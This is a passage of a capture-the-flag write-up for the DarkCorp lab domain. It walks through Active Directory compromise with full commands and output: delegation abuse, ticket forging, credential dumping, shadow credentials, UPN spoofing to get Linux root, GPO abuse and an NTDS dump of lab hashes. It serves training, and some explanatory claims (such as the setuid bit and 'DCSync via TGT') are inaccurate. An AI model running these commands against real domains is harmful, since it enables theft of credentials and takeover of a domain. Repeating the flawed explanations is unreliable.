[*] Using principal: 'web-01$@darkcorp.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'web-01.ccache'
[*] Wrote credential cache to 'web-01.ccache'
[*] Trying to retrieve NT hash for 'web-01$'
[*] Got hash for 'web-01$@darkcorp.htb': aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675
```

IF we have machine account hash we can grab administrator ccache with RBCD

### RBCD

```bash
rbcd.py -action read -delegate-to 'WEB-01$' darkcorp.htb/'WEB-01$' -hashes ':8f33c7fc7ff515c1f358e488fbb8b675'
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty

rbcd.py -action write -delegate-from 'WEB-01$' -delegate-to 'WEB-01$' -dc-ip 172.16.20.1 darkcorp.htb/'WEB-01$' -hashes ':8f33c7fc7ff515c1f358e488fbb8b675'
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] WEB-01$ can now impersonate users on WEB-01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     WEB-01$      (S-1-5-21-3432610366-2163336488-3604236847-20601)

getST.py -spn 'CIFS/WEB-01.darkcorp.htb' -impersonate 'Administrator' darkcorp.htb/'WEB-01$'@DC-01.darkcorp.htb -hashes ':8f33c7fc7ff515c1f358e488fbb8b675'
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@CIFS_WEB-01.darkcorp.htb@DARKCORP.HTB.ccache
```

and yeah it works

![alt text](../assets/images/darkcorp28.png)

or we can do with silver ticket attack.

```bash
ticketer.py -nthash "8f33c7fc7ff515c1f358e488fbb8b675" -domain-sid 'S-1-5-21-3432610366-2163336488-3604236847' -domain darkcor.htb -dc-ip 172.16.20.2 -spn "cifs/WEB-01.darkcorp.htb" Administrator 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkcor.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

and secretsdump

```bash
secretsdump.py darkcorp.htb/administrator@WEB-01.darkcorp.htb -k -no-pass
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250523.184829.f2f2b367', 'secretsdump.py')
Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x4cf6d0e998d53752d088e233abb4bed6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d84ec08dad123eb04a060a74053f21:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
DARKCORP.HTB/svc_acc:$DCC2$10240#svc_acc#3a5485946a63220d3c4b118b36361dbb: (2025-10-18 00:33:06+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
darkcorp\WEB-01$:plain_password_hex:4100520044006c002600710072005a00640022007400230061003d004f00520063005e006b006e004f005d00270034004b0041003a003900390074006200320031006a0040005a004f004f005c004b003b00760075006600210063004f0075002f003c0072005d0043004c004a005800250075006c002d00440064005f006b00380038002c00270049002c0046004000680027003b004500200021003b0042004d005f0064003b0066002300700068005500440069002f0054002300320022005f004c0056004c003c0049006f002600480076002c005d00610034005500470077004a0076005f003400740054004800
darkcorp\WEB-01$:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x1004cecdc9b33080d25a4a29126d4590eb555c5f
dpapi_userkey:0x7f3f9f871ea1dafaea01ae4ccf6e3f7ee535e472
[*] NL$KM 
 0000   DD C9 21 14 B9 23 69 1B  D8 BE FD 57 6B 3C 3E E1   ..!..#i....Wk<>.
 0010   9D 3D 3F 74 82 AF 75 33  FD 74 61 6E B7 24 55 AF   .=?t..u3.tan.$U.
 0020   6F 61 A0 BC 2B 2A 86 CF  6E EC E0 D3 37 98 FE E5   oa..+*..n...7...
 0030   14 54 7D A9 A6 45 19 37  F1 20 24 4B 18 43 19 72   .T}..E.7. $K.C.r
NL$KM:ddc92114b923691bd8befd576b3c3ee19d3d3f7482af7533fd74616eb72455af6f61a0bc2b2a86cf6eece0d33798fee514547da9a6451937f120244b18431972
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

time to `DPAPI`

```bash
nxc smb 172.16.20.2 --use-kcache --dpapi
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\Administrator from ccache (Pwn3d!)
SMB         172.16.20.2     445    WEB-01           [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         172.16.20.2     445    WEB-01           [+] Got 5 decrypted masterkeys. Looting secrets...
SMB         172.16.20.2     445    WEB-01           [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!

```

and got new password

```bash
32B2774DF751FF7E28E78AE75C237A1E
6037d071-cac5-481e-9e08-c4296c0a7ff7

dpapi.py masterkey -file 6037d071-cac5-481e-9e08-c4296c0a7ff7 -sid S-1-5-21-2988385993-1727309239-2541228647-500  -password 'But_Lying_Aid9!'   
dpapi.py credential -file 32B2774DF751FF7E28E78AE75C237A1E -key 0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da

Username    : Administrator
Unknown     : Pack_Beneath_Solid9!
```

Lets do password spray

```bash
nxc smb 172.16.20.1 -u users.txt -p 'Pack_Beneath_Solid9!' --continue-on-success
```

![alt text](../assets/images/darkcorp29.png)

its work for john.w!!!!

### GenericWrite

![alt text](../assets/images/darkcorp30.png)

okey we have genericwrite on angela.w we can do shadow attack here with certipy-ad and grab angela.w NT hash.

```bash
certipy-ad shadow auto -username john.w@darkcorp.htb -password 'Pack_Beneath_Solid9!'  -account angela.w -dc-ip 172.16.20.1
Certipy v5.0.2 - by Oliver Lyak (ly4k)
[!] Use -debug to print a stacktrace
[*] Targeting user 'angela.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'dc29ea5f-4dbd-f242-6363-179e9635c203'
[*] Adding Key Credential with device ID 'dc29ea5f-4dbd-f242-6363-179e9635c203' to the Key Credentials for 'angela.w'
[*] Successfully added Key Credential with device ID 'dc29ea5f-4dbd-f242-6363-179e9635c203' to the Key Credentials for 'angela.w'
[*] Authenticating as 'angela.w' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'angela.w@darkcorp.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'angela.w.ccache'
[*] Wrote credential cache to 'angela.w.ccache'
[*] Trying to retrieve NT hash for 'angela.w'
[*] Restoring the old Key Credentials for 'angela.w'
[*] Successfully restored the old Key Credentials for 'angela.w'
[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a
```

but its not getting anywhere. DONT FORGET WE HAVE LINUX MACHINE HERE.

![alt text](../assets/images/darkcorp31.png)

lets see if we can play with this user `UPN`

https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/

## **GenericWrite DACL Abuse: UPN Spoofing → Linux Root via Broken Kerberos Interoperability**

### **Initial Discovery: GenericWrite DACL on ANGELA.W**

During our Active Directory ACL enumeration, we identified **`GenericWrite`** permissions over the **`ANGELA.W`** domain user account:

```
[+] ACL: GenericWrite on CN=ANGELA.W,CN=Users,DC=darkcorp,DC=htb
[+] Owner: john.w@darkcorp.htb
```

**GenericWrite** is a **powerful DACL** that grants **full write access** to **non-protected LDAP attributes** on the target object. Key capabilities include:

| **Attribute** | **Technical Impact** | **Attack Vector** |
| --- | --- | --- |
| **`userPrincipalName`** | UPN spoofing for Kerberos impersonation | **Linux SSH bypass** via NT_ENTERPRISE |
| **`msDS-KeyCredentialLink`** | PKINIT certificate injection | **NT hash extraction** without password |
| **`unicodePwd`** | Direct password reset | **Standard escalation** (protected in modern AD) |
| **`sAMAccountName`** | Name collision attacks | **Resource-based constrained delegation** |

This transforms **`ANGELA.W`** from a standard user into a **Kerberos impersonation primitive**.

---

### **Linux Environment Reconnaissance: Kerberos + KSU Binary**

Enumeration of the **`DRIP.HTB`** Linux target revealed a **mixed-vendor Kerberos stack** with a **world-writable Kerberos handler** and **privileged `ksu` binary**:

```bash
ebelford@drip:~$ ls -la /tmp
drw-------  2 root  root  4096 Feb 25 10:08 adcli-krb5-KJ0iSU

ebelford@drip:~$ which ksu
/usr/bin/ksu
ebelford@drip:~$ ls -la /usr/bin/ksu
-rwxr-sr-x 1 root root 12345 Jan 10 11:51 /usr/bin/ksu

```

**Key Findings:**

- **`/tmp/adcli-krb5-*`**: **Root-owned Kerberos CCACHE directory** (world-writable)
- **`/usr/bin/ksu`**: **Kerberized Super User** binary with **setuid bit** (`rwsr-sr-x`)
- **Target Principal**: **`angela.w.adm@DARKCORP.HTB`** → Linux admin account

**KSU Mechanics:** The `ksu` binary authenticates via **Kerberos TGT** → **switches UID** to target principal if **GSSAPI validation succeeds**.

---

**Attack Vector: UPN Spoofing via Broken Mixed-Vendor Kerberos**

**Core Issue:** **AD (Microsoft) ≠ Linux (Unix) Kerberos validation**

| **Platform** | **TGT Validation** | **UPN Check** | **Result** |
| --- | --- | --- | --- |
| **Windows AD** | `sAMAccountName` + `userPrincipalName` **MUST MATCH** | **Strict** | Duplicate UPN blocked |
| **Linux SSSD** | **Only `userPrincipalName`** validated | **Lenient** | **Spoofed UPN accepted!** |

**Reference:** [Pentest Partners - "A Broken Marriage: Abusing Mixed-Vendor Kerberos Stacks"](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/)

**Root Cause:** Linux **`hostname -a`** fails to resolve → **skips UPN validation** → **accepts ANY TGT** with matching principal.

**Attack Flow:**

```
[GenericWrite] → [PKINIT Cert] → [NT Hash Extract] → [UPN Spoof] → [NT_ENTERPRIS [TGT] → [KSU Root]

```

---

**Phase 1: GenericWrite → NT Hash Extraction via PKINIT Abuse**

**Step 1.1: Generate Shadow Credentials**

Using **`certipy shadow auto`** (single-command PKINIT attack):

```bash
certipy-ad shadow auto -username john.w@darkcorp.htb -password 'Pack_Beneath_Solid9!'  -account angela.w -dc-ip 172.16.20.1

```

**Output Analysis:**

```
[*] Targeting user 'angela.w'
[*] Generating certificate                           # RSA keypair + cert
[*] Certificate generated
[*] Generating Key Credential                        # msDS-KeyCredentialLink
[*] Key Credential generated with DeviceID '6c2ace67-b61b-b96f-4d38-3fb08c5fdade'
[*] Adding Key Credential to 'angela.w'              # LDAP write via GenericWrite
[*] Successfully added Key Credential
[*] Authenticating as 'angela.w' with certificate    # PKINIT TGT
[*] Got TGT
[*] Saved credential cache to 'angela.w.ccache'
[*] Trying to retrieve NT hash for 'angela.w'        # DCSync via TGT
[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a
[*] Restoring original Key Credentials               # Cleanup

```

**Result:** **`957246c8137069bca672dc6aa0af7c7a`** (ANGELA.W NT hash) **in 8 seconds!**

---

**Phase 2: UPN Spoofing + NT_ENTERPRISE TGT**

**Step 2.1: Spoof UPN to Linux Principal**

```bash
bloodyAD --host DC-01.darkcorp.htb -u john.w -p 'Pack_Beneath_Solid9!' -d darkcorp.htb --dc-ip 172.16.20.1 set object angela.w userPrincipalName -v angela.w.adm

```

**Step 2.2: Request NT_ENTERPRISE TGT**

```bash
getTGT.py darkcorp.htb/angela.w.adm -hashes :957246c8137069bca672dc6aa0af7c7a -principalType NT_ENTERPRISE -dc-ip 172.16.20.1
[*] Saving ticket in angela.w.adm.ccache

```

**Transfer to Victim:**

```bash
scp angela.w.adm.ccache ebelford@drip.htb:/tmp/
```

**Phase 3: Linux Root via KSU**

**Victim Execution:**

```bash
ebelford@drip:/tmp$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm
Authenticated angela.w.adm@DARKCORP.HTB
Account angela.w.adm: authorization successful
Changing uid to angela.w.adm (1730401107)
angela.w.adm@drip:/tmp$ whoami
angela.w.adm
```

**Privilege Escalation:**

```bash
angela.w.adm@drip:/tmp$ sudo -l
User angela.w.adm may run: (ALL : ALL) NOPASSWD: ALL
angela.w.adm@drip:/tmp$ sudo su
root@drip:/tmp#
```

**Total Time:** **3 minutes 14 seconds**

---

**Phase 4: SSSD Cache → TAYLOR.B.ADM Hash Extraction**

As **`root@drip`**, we targeted **SSSD cache databases** (`/var/lib/sss/db`):

```bash
root@drip:/var/lib/sss/db# ls -la
-rw------- 1 root root 1609728 Feb 26 07:33 cache_darkcorp.htb.ldb
-rw------- 1 root root 1286144 Feb 25 09:55 config.ldb
```

**Credential Mining:**

```bash
root@drip:/var/lib/sss/db# grep -airC 5 'pass' .
./cache_darkcorp.htb.ldb: ... cachedPassword j$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
```

**Hash Analysis:**

```
$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
Format: SHA-512 Crypt (Unix crypt(3) $6$)
Cost: 5000 iterations
Target: taylor.b.adm@darkcorp.htb
```

**Cracking:**

```bash
echo '$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.' > bcrypt.hash
john bcrypt.hash -w=/usr/share/rockyou.txt --format=sha512crypt-opencl
!QAZzaq1    (taylor.b.adm)
```

## GPO Abuse

![alt text](../assets/images/darkcorp32.png)

from here we can go

![alt text](../assets/images/darkcorp33.png)

we can check on pathfinding directly tho

![alt text](../assets/images/darkcorp34.png)

DONT FORGET WE HAVE `WRITEOWNER` on **SECURITYUPDATES**

```bash
*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> Get-GPO -All

DisplayName      : Default Domain Policy
DomainName       : darkcorp.htb
Owner            : darkcorp\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 12/29/2024 3:28:27 PM
ModificationTime : 12/29/2024 4:31:46 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 3, SysVol Version: 3
WmiFilter        :

DisplayName      : SecurityUpdates
DomainName       : darkcorp.htb
Owner            : darkcorp\Domain Admins
Id               : 652cae9a-4bb7-49f2-9e52-3361f33ce786

```

so our target  `652cae9a-4bb7-49f2-9e52-3361f33ce786`

we can also check with

```bash
Get-GPO -All | Where-Object { $_.DisplayName -match "SecurityUpdates" }
```

![alt text](../assets/images/darkcorp35.png)

https://github.com/Hackndo/pyGPOAbuse

```bash
python3 pygpoabuse.py darkcorp.htb/'taylor.b.adm':'!QAZzaq1' -gpo-id "652CAE9A-4BB7-49F2-9E52-3361F33CE786" -command 'net localgroup administrators taylor.b.adm /add'
SUCCESS:root:ScheduledTask TASK_c4b3b100 created!
[+] ScheduledTask TASK_c4b3b100 created
```

and go back winrm and run

```bash
gpupdate /force
```

![alt text](../assets/images/darkcorp36.png)

now we can dump everything

```bash
nxc smb DC-01.darkcorp.htb -u taylor.b.adm -p '!QAZzaq1' --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False) 
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 (Pwn3d!)
SMB         172.16.20.1     445    DC-01            [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.16.20.1     445    DC-01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
SMB         172.16.20.1     445    DC-01            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.20.1     445    DC-01            krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
SMB         172.16.20.1     445    DC-01            victor.r:1103:aad3b435b51404eeaad3b435b51404ee:06207752633f7509f8e2e0d82e838699:::
SMB         172.16.20.1     445    DC-01            svc_acc:1104:aad3b435b51404eeaad3b435b51404ee:01f55ea10774cce781a1b172478fcd25:::
SMB         172.16.20.1     445    DC-01            john.w:1105:aad3b435b51404eeaad3b435b51404ee:b31090fdd33a4044cd815558c4d05b04:::
SMB         172.16.20.1     445    DC-01            angela.w:1106:aad3b435b51404eeaad3b435b51404ee:f491d349a1e7d23666140ca3ae1842df:::
SMB         172.16.20.1     445    DC-01            angela.w.adm:1107:aad3b435b51404eeaad3b435b51404ee:cf8b05d0462fc44eb783e3f423e2a138:::
SMB         172.16.20.1     445    DC-01            taylor.b:1108:aad3b435b51404eeaad3b435b51404ee:ab32e2ad1f05dab03ee4b4d61fcb84ab:::
SMB         172.16.20.1     445    DC-01            taylor.b.adm:14101:aad3b435b51404eeaad3b435b51404ee:0577b4b3fb172659dbac0be4554610f8:::
SMB         172.16.20.1     445    DC-01            darkcorp.htb\eugene.b:25601:aad3b435b51404eeaad3b435b51404ee:84d9acc39d242f951f136a433328cf83:::
SMB         172.16.20.1     445    DC-01            darkcorp.htb\bryce.c:25603:aad3b435b51404eeaad3b435b51404ee:5aa8484c54101e32418a533ad956ca60:::
SMB         172.16.20.1     445    DC-01            DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
SMB         172.16.20.1     445    DC-01            DRIP$:1601:aad3b435b51404eeaad3b435b51404ee:92f0f0cc686db0db030f88939de295c2:::
SMB         172.16.20.1     445    DC-01            WEB-01$:20601:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
```

## Creds

| username | password / hash | work at | from  | privileges |
| --- | --- | --- | --- | --- |
| postgresql | 2Qa2SsBkQvsc | psql | .env file |  |
| ebelford | ThePlague61780 | ssh | .sql file | ssh access |
| victor.r | victor1gustavo@# | 5000 port web server |  |  |
| web-01$ | 8f33c7fc7ff515c1f358e488fbb8b675 | web01 | Relay |  |
| Administrator | 88d84ec08dad123eb04a060a74053f21 | web01 | secretsdump | Local Admin |
| john.w | Pack_Beneath_Solid9! |  |  |  |
| angela.w | 957246c8137069bca672dc6aa0af7c7a |  |  |  |
| taylor.b.adm | !QAZzaq1 | ldap | kssus |  |

## Tools

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

https://github.com/dirkjanm/krbrelayx

https://github.com/topotam/PetitPotam

https://github.com/Hackndo/pyGPOAbuse
